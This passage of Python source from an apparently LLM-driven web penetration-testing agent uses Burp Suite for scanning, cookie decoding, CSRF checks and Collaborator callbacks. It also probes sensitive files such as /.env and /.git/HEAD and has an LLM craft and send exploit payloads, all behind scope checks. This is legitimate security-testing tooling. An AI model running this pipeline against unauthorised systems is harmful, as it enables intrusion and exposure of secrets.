                from pentra_agent.utils.burp_utils import decode_interesting_value as _decode_val
                import re as _rec
                _b64_like = _rec.compile(r'^[A-Za-z0-9+/]{20,}={0,2}$')
                _decoded_count = 0
                for _entry in history[:20]:   # cap analysis at first 20 entries
                    if _decoded_count >= 5 or not _entry.request:
                        break
                    _ck_match = _rec.search(
                        r'Cookie:\s*(.+?)(?:\r?\n|$)', _entry.request, _rec.IGNORECASE
                    )
                    if not _ck_match:
                        continue
                    for _cpair in _ck_match.group(1).split(';')[:3]:  # max 3 cookies
                        _cname, _, _cval = _cpair.strip().partition('=')
                        _cval = _cval.strip()
                        if not _cval or len(_cval) < 20:
                            continue
                        if not (_b64_like.match(_cval) or '%' in _cval):
                            continue
                        _decoded = await _decode_val(client, _cval)
                        if len(_decoded) > 1:   # has variants beyond just "original"
                            _decoded_count += 1
                            log.info(
                                "[vuln_hunt_node] Cookie '%s' decoded: %s",
                                _cname.strip(), _decoded,
                            )
                            try:
                                enforcer.validate_or_raise(_entry.url)
                            except ScopeViolationError:
                                continue
                            findings.append({
                                "title": f"Interesting Encoded Cookie: {_cname.strip()}",
                                "description": (
                                    f"Cookie '{_cname.strip()}' contains an encoded value. "
                                    f"Decoded representations: {_decoded}. "
                                    f"May reveal session tokens, role flags, or user identifiers."
                                ),
                                "severity": "info",
                                "target_url": _entry.url,
                                "vuln_class": "INFORMATION_DISCLOSURE",
                                "request": f"Cookie: {_cname.strip()}=<value>",
                                "response": f"Decoded: {_decoded}",
                                "source": "burp_cookie_decode",
                            })
            except Exception as _dc_exc:
                log.debug("[vuln_hunt_node] Cookie decode analysis error (non-fatal): %s", _dc_exc)

            log.info("[vuln_hunt_node] Burp proxy findings: %d entries", len(findings))
            return findings
        except (BurpConnectionError, Exception) as exc:
            log.warning("[vuln_hunt_node] Burp proxy history error: %s", exc)
            return []


async def _run_burp_active_scan(endpoints: list[dict], scope: dict) -> list[dict]:
    """Trigger Burp active scan probes and collect scanner issues (Pro only).

    Steps:
      1. Scope-check each endpoint before sending to Burp.
      2. Call ``trigger_active_scan()`` to probe via Burp HTTP engine.
      3. Fetch ``get_scan_results()`` to collect any issues found.
    """
    burp_url, burp_enabled = _get_burp_config()
    if not burp_url or not burp_enabled or not _BURP_AVAILABLE or not endpoints:
        return []

    in_scope: list[str] = scope.get("in_scope", [])
    out_of_scope: list[str] = scope.get("out_of_scope", [])
    enforcer = ScopeEnforcer(in_scope=in_scope, out_of_scope=out_of_scope)

    client = BurpMCPClient(base_url=burp_url)
    if not await client.health_check():
        log.info("[vuln_hunt_node] Burp not reachable — skipping active scan")
        return []

    async with client.managed_session():
        probed_urls: list[str] = []
        for ep in endpoints:
            url = ep.get("url", "")
            if not url:
                continue
            # Scope check before every Burp call
            try:
                enforcer.validate_or_raise(url)
            except ScopeViolationError as exc:
                log.warning("[vuln_hunt_node] Active scan skipped for %s — scope: %s", url, exc)
                continue
            try:
                await client.trigger_active_scan(url=url, scope=in_scope)
                probed_urls.append(url)
                log.debug("[vuln_hunt_node] Burp scan probe sent: %s", url)
            except BurpConnectionError:
                log.info("[vuln_hunt_node] Burp disconnected during active scan")
                break
            except Exception as exc:
                log.warning("[vuln_hunt_node] trigger_active_scan error for %s: %s", url, exc)

        if not probed_urls:
            return []

        # Extract domains of probed URLs so we only accept scanner issues for THIS scan.
        # Bug: get_scan_results returns ALL Burp scanner issues (incl. from previous projects).
        # Without domain filtering, issues from other targets leak in — or get scope-rejected.
        from urllib.parse import urlparse as _up_scan
        _probed_hosts: set[str] = {
            (_up_scan(u).hostname or "").lower() for u in probed_urls
        }

        # Collect scanner issues (Pro-only — graceful fallback for Community)
        findings: list[dict] = []
        try:
            issues = await client.get_scan_results(limit=50)
            for issue in issues:
                # Primary filter: issue must belong to a probed host (not from another project)
                _issue_host = (_up_scan(issue.url).hostname or "").lower()
                if _probed_hosts and _issue_host not in _probed_hosts:
                    log.debug(
                        "[vuln_hunt_node] Burp scanner issue skipped (wrong host %s, probed=%s): %s",
                        _issue_host, _probed_hosts, issue.url,
                    )
                    continue
                # Secondary: scope check
                try:
                    enforcer.validate_or_raise(issue.url)
                except ScopeViolationError:
                    continue
                findings.append({
                    "title": issue.name or issue.issue_type or "Burp Scanner Issue",
                    "description": issue.detail or "",
                    "severity": normalize_severity(issue.severity),
                    "target_url": issue.url,
                    "vuln_class": issue.issue_type or "Misconfiguration",
                    "request": "",
                    "response": "",
                    "source": "burp_scanner",
                    "confidence": issue.confidence,
                })
            log.info("[vuln_hunt_node] Burp scanner issues: %d (from %d total)", len(findings), len(issues))
        except BurpNotProError:
            log.info("[vuln_hunt_node] Burp scanner issues require Pro — skipping")
        except (BurpConnectionError, Exception) as exc:
            log.warning("[vuln_hunt_node] get_scan_results error: %s", exc)

        return findings


async def _get_collaborator_payload(
    custom_data: str,
    scope: dict,
    domain: str,
) -> dict | None:
    """Generate a Burp Collaborator OOB payload for SSRF/blind injection testing.

    The payload URL is returned as a tool_output dict so the LLM can reference
    it when constructing SSRF/XXE/header-injection payloads.
    Requires Burp Suite Pro.
    """
    burp_url, burp_enabled = _get_burp_config()
    if not burp_url or not burp_enabled or not _BURP_AVAILABLE:
        return None

    in_scope: list[str] = scope.get("in_scope", [])
    out_of_scope: list[str] = scope.get("out_of_scope", [])
    enforcer = ScopeEnforcer(in_scope=in_scope, out_of_scope=out_of_scope)
    try:
        enforcer.validate_or_raise(domain)
    except ScopeViolationError as exc:
        log.warning("[vuln_hunt_node] Collaborator skipped — scope: %s", exc)
        return None

    client = BurpMCPClient(base_url=burp_url)
    if not await client.health_check():
        return None

    async with client.managed_session():
        try:
            payload = await client.generate_collaborator_payload(custom_data=custom_data)
            log.info("[vuln_hunt_node] Collaborator payload: %s", payload.payload)
            return {
                "tool": "burp_collaborator",
                "payload_url": payload.payload,
                "payload_id": payload.payload_id,
                "usage": (
                    "Inject this URL as SSRF target, blind XSS callback, "
                    "XXE external entity, or Host header value."
                ),
            }
        except BurpNotProError:
            log.info("[vuln_hunt_node] Collaborator requires Burp Pro — skipping")
            return None
        except (BurpConnectionError, Exception) as exc:
            log.warning("[vuln_hunt_node] generate_collaborator_payload error: %s", exc)
            return None


async def _direct_request(
    url: str,
    method: str = "GET",
    body: str | None = None,
    headers: dict | None = None,
    proxy: str | None = None,
    timeout: float = 30.0,
) -> tuple[str, str]:
    """Direct httpx HTTP request when Burp MCP is unavailable.

    Returns (raw_request_summary, raw_response_body) strings.
    HexStrike FailureRecoverySystem: ensures pipeline runs even without Burp.
    """
    import httpx as _httpx

    req_headers = {"User-Agent": "Mozilla/5.0 (Pentra-AI Security Scanner)"}
    if headers:
        req_headers.update(headers)

    def _make_client(t: float) -> dict:
        kw: dict = {"follow_redirects": True, "timeout": t, "verify": False}
        if proxy:
            kw["proxy"] = proxy
        return kw

    async def _do_request(target_url: str, t: float) -> tuple[str, str]:
        async with _httpx.AsyncClient(**_make_client(t)) as hc:
            resp = await hc.request(
                method=method,
                url=target_url,
                headers=req_headers,
                content=body.encode() if body else None,
            )
            raw_req = f"{method} {target_url}\n" + "\n".join(f"{k}: {v}" for k, v in req_headers.items())
            raw_resp = (
                f"HTTP {resp.status_code}\n"
                + "\n".join(f"{k}: {v}" for k, v in resp.headers.items())
                + "\n\n"
                + resp.text[:8000]
            )
            return raw_req, raw_resp

    try:
        # Use a short connect timeout for HTTPS so fallback is fast when port 443
        # is closed (common on HTTP-only test targets like vulnweb.com).
        https_timeout = min(timeout, 5.0) if url.startswith("https://") else timeout
        return await _do_request(url, https_timeout)
    except Exception as exc:
        # HTTPS→HTTP fallback: many test targets don't have a valid TLS cert or
        # have port 443 closed while port 80 is open.
        if url.startswith("https://"):
            http_url = "http://" + url[8:]
            try:
                return await _do_request(http_url, timeout)
            except Exception as exc2:
                return f"{method} {url}", f"ERROR: {exc2}"
        return f"{method} {url}", f"ERROR: {exc}"


async def _passive_csrf_check(domain: str, scope: dict) -> list[dict]:
    """Passive CSRF detection: crawl key pages and detect POST forms missing CSRF tokens.

    Checks for:
    - ASP.NET __RequestVerificationToken
    - Generic csrf_token / _token / authenticity_token / nonce fields
    """
    import re as _re

    in_scope = scope.get("in_scope", [])
    out_of_scope = scope.get("out_of_scope", [])
    enforcer = ScopeEnforcer(in_scope=in_scope, out_of_scope=out_of_scope)
    burp_proxy = _get_burp_proxy()

    try:
        enforcer.validate_or_raise(domain)
    except ScopeViolationError:
        return []

    # Crawl pages known to have forms
    form_pages = [
        f"http://{domain}/login.aspx",
        f"http://{domain}/login",
        f"http://{domain}/Signup.aspx",
        f"http://{domain}/register",
        f"http://{domain}/",
        f"http://{domain}/contact.aspx",
        f"http://{domain}/search.aspx",
        f"http://{domain}/Search.aspx",
        f"http://{domain}/comment.aspx?id=1",
    ]

    findings: list[dict] = []
    seen_urls: set[str] = set()

    for page_url in form_pages:
        try:
            enforcer.validate_or_raise(page_url)
        except ScopeViolationError:
            continue
        try:
            _, html = await _direct_request(page_url, proxy=burp_proxy)
        except Exception:
            continue

        # Find all POST forms
        for form_match in _re.finditer(
            r"<form[^>]*method=[\"']post[\"'][^>]*>(.*?)</form>",
            html,
            _re.IGNORECASE | _re.DOTALL,
        ):
            form_html = form_match.group(0)
            # Extract form action for deduplication
            action_m = _re.search(r'action=["\']([^"\']*)["\']', form_html, _re.IGNORECASE)
            action = action_m.group(1) if action_m else page_url
            if not action.startswith("http"):
                action = f"http://{domain}{action if action.startswith('/') else '/' + action}"
            if action in seen_urls:
                continue
            seen_urls.add(action)

            # Check for CSRF token presence
            has_csrf = bool(_re.search(
                r"(?:__RequestVerificationToken|csrf_token|_csrf|authenticity_token"
                r"|x-csrf-token|nonce|_token)",
                form_html,
                _re.IGNORECASE,
            ))
            if not has_csrf:
                # Extract visible input names for context
                inputs = _re.findall(r'<input[^>]+name=["\']([^"\']+)["\']', form_html, _re.IGNORECASE)
                findings.append({
                    "title": f"CSRF — POST Form Missing Anti-CSRF Token",
                    "description": (
                        f"A POST form on {page_url} (action={action}) has no CSRF token.\n"
                        f"Form fields detected: {', '.join(inputs[:8]) or 'none'}\n"
                        f"An attacker can craft a page that auto-submits this form, "
                        f"performing actions on behalf of any authenticated victim."
                    ),
                    "severity": "medium",
                    "target_url": page_url,
                    "vuln_class": "CSRF",
                    "request": f"GET {page_url}",
                    "response": html[:500],
                    "source": "passive_csrf_check",
                    "impact": f"Cross-site request forgery on {action}",
                    "remediation": (
                        "Add __RequestVerificationToken (ASP.NET) or equivalent CSRF token "
                        "to all POST forms. Validate token server-side."
                    ),
                    "cvss_score": 6.5,
                    "false_positive_risk": "low",
                })
                log.info("[csrf_check] CSRF found: form at %s → action=%s", page_url, action)

    log.info("[csrf_check] CSRF scan complete: %d finding(s) from %d pages", len(findings), len(form_pages))
    return findings


async def _run_llm_burp_active_testing(
    domain: str,
    endpoints: list[dict],
    scope: dict,
    tech_stack: list[str],
    llm: LLMClient,
    engagement_id: str,
    pentest_plan: str = "",
    kb_context: list[dict] | None = None,
    auth_credentials: dict | None = None,
) -> list[dict]:
    """LLM-driven active exploit testing — Burp optional, always runs.

    Pipeline:
      1. Crawl target pages (via Burp if available, else direct httpx).
      2. Pull Burp proxy history (only if Burp available).
      3. LLM analyzes traffic → injection candidates.
         Fallback A (PentAGI): extract URL query params from traffic.
         Fallback B (HexStrike TechDetector): tech-aware known injection points.
      4. Generate Collaborator payload (only if Burp Pro available).
      5. LLM crafts exploit payloads per candidate.
      6. Send payloads (via Burp if available, else direct httpx).
      7. LLM analyzes responses → confirm/deny findings.
      8. Poll Collaborator for OOB hits (only if Burp Pro available).
      9. Open confirmed findings in Burp Repeater (only if Burp available).

    HexStrike FailureRecoverySystem: Burp is optional — pipeline degrades
    gracefully to direct httpx when Burp MCP is unavailable.
    """
    in_scope: list[str] = scope.get("in_scope", [])
    out_of_scope: list[str] = scope.get("out_of_scope", [])
    enforcer = ScopeEnforcer(in_scope=in_scope, out_of_scope=out_of_scope)

    # ── Auth setup (Task 18.6) ────────────────────────────────────────────────
    # Build auth headers/cookies to inject into every scan request.
    _auth_headers: dict[str, str] = {}
    _auth_cookies: dict[str, str] = {}
    if auth_credentials:
        try:
            from pentra_tools.auth.session_manager import AuthCredentials, SessionManager
            _creds_obj = AuthCredentials(**auth_credentials)
            if not _creds_obj.is_empty():
                _mgr = SessionManager(_creds_obj)
                if _creds_obj.type == "auto_login":
                    _login_result = await _mgr.auto_login()
                    if _login_result.success:
                        _auth_headers = _login_result.headers
                        _auth_cookies = _login_result.cookies
                        log.info(
                            "[auth] Auto-login succeeded — %d cookies for authenticated scan",
                            len(_auth_cookies),
                        )
                    else:
                        log.warning("[auth] Auto-login FAILED: %s — continuing unauthenticated", _login_result.error)
                else:
                    _auth_headers, _auth_cookies = _mgr.get_auth_headers()
                    log.info(
                        "[auth] Auth injected: type=%s headers=%s cookies=%d",
                        _creds_obj.type, list(_auth_headers.keys()), len(_auth_cookies),
                    )
        except Exception as _auth_exc:
            log.warning("[auth] Auth setup failed (non-fatal): %s", _auth_exc)

    # ── Burp connection check (optional) ─────────────────────────────────────
    # HexStrike FailureRecoverySystem: Burp unavailability must not block the
    # pipeline. Fall back to direct httpx for all network operations.
    burp_available = False
    client = None
    _burp_session_cm = None   # persistent managed_session CM for entire scan
    burp_url, burp_enabled = _get_burp_config()
    burp_proxy = _get_burp_proxy()

    if burp_url and burp_enabled and _BURP_AVAILABLE:
        _client = BurpMCPClient(base_url=burp_url)
        if await _client.health_check():
            burp_available = True
            client = _client
            log.info("[llm_burp] Burp connected — running full pipeline for %s", domain)
            # Open one persistent SSE session for the entire scan — avoids
            # Burp's session pool limit (~4 concurrent sessions).
            _burp_session_cm = client.managed_session()
            await _burp_session_cm.__aenter__()  # type: ignore[misc]
        else:
            log.info(
                "[llm_burp] Burp not reachable — running without Burp (direct httpx) for %s",
                domain,
            )
    else:
        log.info("[llm_burp] Burp not configured — running without Burp (direct httpx) for %s", domain)

    # ── Step 1: Crawl target — capture req/resp ───────────────────────────────
    crawl_paths = [
        # Authentication surfaces
        "/", "/login", "/login.aspx", "/signin", "/register", "/register.aspx",
        "/Signup.aspx", "/logout", "/forgot-password", "/reset-password",
        # Search / input surfaces
        "/search", "/search.aspx", "/Search.aspx",
        # Admin / debug surfaces
        "/admin", "/admin.aspx", "/debug/", "/actuator/health", "/phpinfo.php",
        # Sensitive files (quick passive check)
        "/.env", "/.git/HEAD", "/web.config", "/backup.zip", "/config.php",
        # API patterns
        "/api/", "/api/v1/", "/api/v1/users", "/api/v1/products", "/graphql",
        # Profile / user data (IDOR surfaces)
        "/profile", "/user", "/account",
        # Content pages
        "/about.aspx", "/contact.aspx",
        # ASP.NET ACME demo surfaces (parameterized)
        "/listproducts.aspx", "/categories.aspx", "/artists.aspx", "/comment.aspx",
        "/ReadNews.aspx?id=1", "/ReadNews.aspx?id=2", "/ReadNews.aspx?id=3",
        "/Comments.aspx?id=1", "/Comments.aspx?id=2", "/Comments.aspx?id=3",
        "/listproducts.aspx?cat=1", "/listproducts.aspx?cat=2",
        "/Search.aspx?tfSearch=test",
        "/artists.aspx?id=1", "/artists.aspx?id=2",
        "/comment.aspx?id=1",
    ]
    base_url_for_crawl = ""
    for ep in endpoints[:3]:
        url = ep.get("url", "")
        if url:
            from urllib.parse import urlparse as _up
            p = _up(url)
            base_url_for_crawl = f"{p.scheme}://{p.netloc}"
            break

    crawl_traffic: list[dict] = []
    discovered_urls: set[str] = set()

    if base_url_for_crawl:
        crawl_queue = [f"{base_url_for_crawl}{path}" for path in crawl_paths]
        log.info(
            "[llm_burp] Crawling %d pages via %s...",
            len(crawl_queue),
            "Burp" if burp_available else "httpx",
        )
        idx = 0
        while idx < len(crawl_queue) and idx < _CRAWL_PAGES:  # preset-controlled crawl depth
            crawl_url = crawl_queue[idx]
            idx += 1
            if crawl_url in discovered_urls:
                continue
            try:
                enforcer.validate_or_raise(crawl_url)
                discovered_urls.add(crawl_url)
                await asyncio.sleep(0.3)
                if burp_available and client:
                    raw_req, raw_resp = await client.send_request(crawl_url, method="GET")
                else:
                    raw_req, raw_resp = await _direct_request(
                        crawl_url, method="GET"  # no proxy when Burp is down
                    )
                crawl_traffic.append({
                    "url": crawl_url,
                    "method": "GET",
                    "request": raw_req,
                    "response": raw_resp,
                })
                log.debug("[llm_burp] crawled: %s (%d bytes)", crawl_url, len(raw_resp))
                # Discover more URLs with query params from HTML responses
                for linked_url in _extract_linked_urls(crawl_url, raw_resp):
                    if linked_url not in discovered_urls:
                        crawl_queue.append(linked_url)
            except ScopeViolationError:
                continue
            except Exception as exc:
                log.debug("[llm_burp] crawl error %s: %s", crawl_url, exc)
        log.info("[llm_burp] Crawl complete: %d pages, %d responses captured", idx, len(crawl_traffic))

    # ── Step 2: Pull Burp proxy history (only when Burp is available) ─────────
    import re as _re
    escaped_domain = _re.escape(domain)
    proxy_traffic: list[dict] = []
    if burp_available and client:
        try:
            history = await client.get_proxy_history(filter_regex=escaped_domain, limit=50)
            for entry in history:
                if not entry.request:
                    continue
                try:
                    enforcer.validate_or_raise(entry.url)
                except ScopeViolationError:
                    continue
                if entry.url not in discovered_urls:
                    proxy_traffic.append({
                        "url": entry.url,
                        "method": entry.method or "GET",
                        "request": entry.request or "",
                        "response": entry.response or "",
                    })
        except Exception as exc:
            log.warning("[llm_burp] proxy history error: %s", exc)

    # Merge traffic
    traffic = crawl_traffic + proxy_traffic
    log.info(
        "[llm_burp] Traffic for LLM analysis: %d total (%d crawl + %d proxy)",
        len(traffic), len(crawl_traffic), len(proxy_traffic),
    )

    if not traffic:
        log.info("[llm_burp] No traffic captured for %s — skipping LLM analysis", domain)
        return []

    # ── Step 3: LLM identifies injection candidates ───────────────────────────
    log.info("[llm_burp] LLM analyzing %d req/resp pairs for injection points...", len(traffic))
    try:
        candidates = await llm.analyze_traffic_for_injections(
            traffic,
            tech_stack,
            pentest_plan=pentest_plan,
            target_domain=domain,          # HexStrike: explicit auth context
            engagement_id=engagement_id,   # HexStrike: explicit auth context
            kb_context=kb_context or [],   # Historical patterns — guide candidate selection
        )
    except Exception as exc:
        log.warning("[llm_burp] analyze_traffic_for_injections failed: %s", exc)
        candidates = []

    if not candidates:
        # PentAGI "enumerate everything" fallback #1: extract URL query params directly
        log.info(
            "[llm_burp] LLM returned 0 candidates — PentAGI fallback: extract URL params "
            "from %d traffic entries",
            len(traffic),
        )
        candidates = _extract_param_candidates_from_traffic(traffic)
        log.info("[llm_burp] URL-param fallback: %d candidates extracted", len(candidates))

    if not candidates:
        # HexStrike TechnologyDetector fallback #2: tech-aware known injection points
        log.info(
            "[llm_burp] URL-param fallback also empty — HexStrike TechDetector defaults "
            "for tech_stack=%s",
            tech_stack,
        )
        candidates = _get_tech_default_candidates(
            domain, tech_stack, base_url_for_crawl or f"http://{domain}"
        )
        log.info("[llm_burp] TechDetector defaults: %d candidates", len(candidates))

    if not candidates:
        log.info("[llm_burp] No injection candidates found after all fallbacks — exiting")
        return []

    # ── Always supplement: merge URL-extracted params + tech defaults ─────────
    # Even when LLM found something, it may miss URL query params (e.g. ReadNews.aspx?id)
    # or tech-specific known injection points. Merge both to ensure complete coverage.
    _seen_cand: set[tuple[str, str]] = {
        (c.get("url", ""), c.get("param_name", "")) for c in candidates
    }

    _url_supplement = _extract_param_candidates_from_traffic(traffic)
    _added_url = 0
    for _c in _url_supplement:
        _key = (_c.get("url", ""), _c.get("param_name", ""))
        if _key not in _seen_cand:
            candidates.append(_c)
            _seen_cand.add(_key)
            _added_url += 1
    if _added_url:
        log.info("[llm_burp] URL-param supplement: +%d candidates from traffic", _added_url)

    _tech_supplement = _get_tech_default_candidates(
        domain, tech_stack, base_url_for_crawl or f"http://{domain}"
    )
    _added_tech = 0
    for _c in _tech_supplement:
        _key = (_c.get("url", ""), _c.get("param_name", ""))
        if _key not in _seen_cand:
            candidates.append(_c)
            _seen_cand.add(_key)
            _added_tech += 1
    if _added_tech:
        log.info("[llm_burp] TechDetector supplement: +%d tech-default candidates", _added_tech)

    log.info("[llm_burp] Total candidates to test: %d", len(candidates))

    # Sort by priority (high → medium → low)
    _prio_order = {"high": 0, "medium": 1, "low": 2}
    candidates.sort(key=lambda c: _prio_order.get(str(c.get("priority", "low")).lower(), 2))

    # ── Step 4: Generate Collaborator payload (only when Burp Pro available) ──
    collab_url: str | None = None
    collab_payload_id: str | None = None
    if burp_available and client:
        try:
            # Use a unique random marker as custom_data so each engagement's
            # Collaborator interactions are unambiguously traceable.
            from pentra_agent.utils.burp_utils import generate_unique_marker
            _collab_marker = await generate_unique_marker(client)
            collab = await client.generate_collaborator_payload(
                custom_data=_collab_marker
            )
            collab_url = collab.payload
            collab_payload_id = collab.payload_id
            log.info("[llm_burp] Collaborator URL: %s (marker=%s)", collab_url, _collab_marker)
        except BurpNotProError:
            log.info("[llm_burp] Collaborator requires Pro — blind OOB testing disabled")
        except Exception as exc:
            log.warning("[llm_burp] Collaborator error: %s", exc)

    # ── Steps 5–8: For each candidate, craft → send → analyze ────────────────
    confirmed_findings: list[dict] = []
    blind_payload_ids: list[tuple[str, dict]] = []  # (payload_id, candidate)

    # ── Task 18.10: Located Memory — no context forgetting ───────────────────
    # Tracks confirmed findings, exhausted candidates, effective payloads and
    # failed attempts so LLM never wastes time re-testing what was already done.
    from pentra_agent.memory.located_memory import LocatedMemory
    memory = LocatedMemory()

    # Backward-compat alias for react_history (now inside memory)
    react_history = memory.react_history

    # ── Task 18.13: Incremental tracker — skip unchanged endpoints ────────────
    from pentra_agent.incremental import IncrementalTracker
    _incremental = IncrementalTracker.for_domain(domain)
    _incremental.load()

    # ── Task 18.9 — Concurrent candidate testing (XBOW pattern) ─────────────
    # Run up to CONCURRENT_CANDIDATES candidates in parallel.
    # asyncio single-thread model makes shared list appends safe without locks.
    # Semaphore prevents burst-hitting the target and Burp session limit.
    _CAND_SEM = asyncio.Semaphore(CONCURRENT_CANDIDATES)

    async def _test_one(candidate: dict) -> None:
        """Test a single injection candidate — guarded by concurrency semaphore."""
        async with _CAND_SEM:
            cand_url = candidate.get("url", "")
            cand_method = candidate.get("method", "GET")
            param_name = candidate.get("param_name", "")
            param_location = candidate.get("param_location", "query")
            original_value = candidate.get("original_value") or ""
            test_types = candidate.get("test_types") or []
    
            # Fix 2 — Auto-add path_traversal/lfi for LFI-candidate parameters.
            # Ensures NewsAd and other file-path params always get traversal testing
            # even when LLM candidate extraction misses them.
            if _is_lfi_candidate(param_name, original_value):
                _lfi_types_to_add = [
                    t for t in ("path_traversal", "lfi")
                    if t not in [x.lower() for x in test_types]
                ]
                if _lfi_types_to_add:
                    test_types = list(test_types) + _lfi_types_to_add
                    log.info(
                        "[vuln_hunt] LFI candidate: %s=%s — adding tests: %s",
                        param_name, original_value, _lfi_types_to_add,
                    )
    
            if not cand_url or not param_name or not test_types:
                return
            try:
                enforcer.validate_or_raise(cand_url)
            except ScopeViolationError:
                log.warning("[llm_burp] candidate %s out of scope — skip", cand_url)
                return

            # ── Task 18.10: Memory skip gate ─────────────────────────────────
            if memory.is_confirmed(cand_url, param_name):
                log.debug("[memory] Skip %s[%s] — already confirmed", cand_url, param_name)
                return
            if memory.is_exhausted(cand_url, param_name):
                log.debug("[memory] Skip %s[%s] — already exhausted", cand_url, param_name)
                return
    
            log.info(
                "[llm_burp] Testing %s param=%r location=%s tests=%s",
                cand_url, param_name, param_location, test_types,
            )
    
            # ── Playbook selection ────────────────────────────────────────────────
            try:
                from pentra_agent.playbooks import get_playbook_for_context, run_playbook
                matched_playbooks = get_playbook_for_context(
                    tech_stack=tech_stack,
                    url=cand_url,
                    param=param_name,
                )
                if matched_playbooks:
                    log.info(
                        "[vuln_hunt] %d playbook(s) matched for %s[%s]: %s",
                        len(matched_playbooks),
                        cand_url,
                        param_name,
                        [p.name for p in matched_playbooks[:3]],
                    )
                    for pb in matched_playbooks[:2]:  # max 2 playbooks per candidate
                        pb_result = run_playbook(pb, cand_url, param_name, tech_stack)
                        # Inject playbook vuln_class into test_types if not already present
                        if pb.vuln_class.lower() not in [t.lower() for t in test_types]:
                            test_types = list(test_types) + [pb.vuln_class.lower()]
            except Exception as _pb_exc:
                log.debug("[vuln_hunt] playbook selection failed (non-fatal): %s", _pb_exc)
    
            # Get original response for baseline
            import time as _time
            _baseline_time = 0.0  # always initialised — prevents NameError if request fails
            try:
                _t0 = _time.monotonic()
                if burp_available and client:
                    _, original_response = await client.send_request(
                        cand_url, method=cand_method,
                        extra_headers=_auth_headers or None,
                        cookies=_auth_cookies or None,
                    )
                else:
                    _, original_response = await _direct_request(
                        cand_url, method=cand_method,
                        headers=_auth_headers or None,
                    )
                _baseline_time = _time.monotonic() - _t0
            except Exception as exc:
                log.debug("[llm_burp] baseline request failed for %s: %s", cand_url, exc)
                original_response = ""
                _baseline_time = 0.0

            # ── Bug Fix 1: ResponseBaseline — use establish() via httpx for proper baseline ──
            # establish_from_strings() on an empty body gave content_length=0, making
            # score_from_strings() return only +30 (below threshold=40). Use establish()
            # which makes 3 real requests so timing/length data is accurate.
            _endpoint_baseline = None
            if _RESPONSE_BASELINE_AVAILABLE and _ResponseBaseline is not None:
                try:
                    import httpx as _httpx_bl
                    _endpoint_baseline = _ResponseBaseline()
                    async with _httpx_bl.AsyncClient(
                        verify=False, follow_redirects=True, timeout=10.0
                    ) as _bl_client:
                        await _endpoint_baseline.establish(
                            _bl_client,
                            cand_url,
                            param_name,
                            normal_value=str(original_value) if original_value else "1",
                        )
                    log.info("[baseline] Baseline established for %s:%s", cand_url, param_name)
                except Exception as _rbe:
                    log.warning("[baseline] ResponseBaseline establish failed (non-fatal): %s — using string fallback", _rbe)
                    # Fallback: use string-based baseline if httpx fails
                    try:
                        _endpoint_baseline = _ResponseBaseline()
                        _endpoint_baseline.establish_from_strings(
                            url=cand_url,
                            param=param_name,
                            body=original_response,
                            status_code=200,
                            elapsed_ms=_baseline_time * 1000 if _baseline_time > 0 else 500.0,
                        )
                        log.info("[baseline] String-fallback baseline for %s:%s (len=%d)",
                                 cand_url, param_name, len(original_response))
                    except Exception as _rbe2:
                        log.warning("[baseline] Fallback also failed (non-fatal): %s", _rbe2)
                        _endpoint_baseline = None

            # ── Task 18.13: Incremental skip gate ────────────────────────────
            # Skip endpoint if response fingerprint matches cached value — unchanged.
            if _incremental.is_unchanged(cand_url, param_name, original_response):
                log.info("[incremental] Skipping %s[%s] — unchanged since last scan", cand_url, param_name)
                return

            # ── ReAct step: Reason before acting ─────────────────────────────────
            # Task 18.10: prepend memory summary so LLM knows what was already found
            _mem_prefix = memory.observation_prefix(cand_url, param_name)
            observation = (
                (_mem_prefix + "\n" if _mem_prefix else "")
                + f"URL: {cand_url}\n"
                f"Parameter: {param_name} ({param_location})\n"
                f"Test types: {test_types}\n"
                f"Tech stack: {tech_stack}\n"
                f"Baseline response snippet (first 400 chars):\n{original_response[:400]}\n\n"
                f"{DEVELOPER_PSYCHOLOGY_HEURISTICS}"
            )
            try:
                react_out = await llm.react_step(
                    observation=observation,
                    available_actions=["test_injection", "skip_candidate"],
                    history=react_history,
                )
                react_history.append({
                    "url": cand_url,
                    "param": param_name,
                    "thought": react_out.thought,
                    "action": react_out.action,
                })
                # Task 18.10: also record in LocatedMemory for cross-candidate persistence
                memory.add_react_step(cand_url, param_name, react_out.thought, react_out.action)
                log.info(
                    "[vuln_hunt] ReAct Thought: %s | Action: %s",
                    react_out.thought, react_out.action,
                )
                # Fire-and-forget audit log for the Thought
                await write_audit_log(
                    engagement_id=engagement_id,
                    actor="agent/vuln_hunt",
                    action="react_thought",
                    detail={
                        "thought": react_out.thought,
                        "action": react_out.action,
                        "url": cand_url,
                        "param": param_name,
                        "test_types": test_types,
                    },
                )
                if react_out.action == "skip_candidate":
                    log.info(
                        "[vuln_hunt] ReAct: skip_candidate for %s[%s] — reasoning: %s",
                        cand_url, param_name, react_out.thought,
                    )
                    return  # skip — exit _test_one for this candidate
            except Exception as exc:
                log.warning("[vuln_hunt] react_step failed (non-fatal): %s — proceeding with test", exc)
    
            # LLM crafts payloads (only reached if react said test_injection or react_step failed)
            try:
                payloads = await llm.craft_exploit_payloads(
                    url=cand_url,
                    method=cand_method,
                    param_name=param_name,
                    param_location=param_location,
                    original_value=original_value,
                    test_types=test_types,
                    tech_stack=tech_stack,
                    collaborator_url=collab_url,
                )
            except Exception as exc:
                log.warning("[llm_burp] craft_exploit_payloads failed: %s", exc)
                payloads = []
    
            # ── ExploitArsenal supplement ─────────────────────────────────────────
            # Merge proven arsenal payloads with LLM payloads so we always have
            # reliable base payloads even when LLM returns fewer variants.
            try:
                from pentra_agent.arsenal.exploit_arsenal import ExploitArsenal
    
                _vuln_map = {
                    "sqli": "SQL_INJECTION", "sql_injection": "SQL_INJECTION",
                    "xss": "XSS", "cross_site_scripting": "XSS",
                    "lfi": "PATH_TRAVERSAL", "path_traversal": "PATH_TRAVERSAL",
                    "ssrf": "SSRF",
                    "idor": "IDOR",
                    "ssti": "SSTI",
                }
                _first_test_type = (test_types[0] if test_types else "").lower().replace("-", "_")
                _vuln_class = _vuln_map.get(_first_test_type)
                if _vuln_class:
                    arsenal_raw = ExploitArsenal.get_payloads(_vuln_class, tech_stack=tech_stack)
                    # Convert plain strings to payload spec dicts
                    _existing_vals: set[str] = {
                        str(p.get("injected_value", p.get("payload", "")))
                        for p in (payloads or [])
                    }
                    arsenal_specs = [
                        {
                            "injected_value": raw_p,
                            "payload": raw_p,
                            "test_type": _first_test_type,
                            "detection_hint": f"ExploitArsenal proven payload",
                            "uses_collaborator": False,
                        }
                        for raw_p in arsenal_raw[:6]   # cap at 6 arsenal payloads
                        if raw_p not in _existing_vals
                    ]
                    if arsenal_specs:
                        payloads = list(payloads or []) + arsenal_specs
                        log.info(
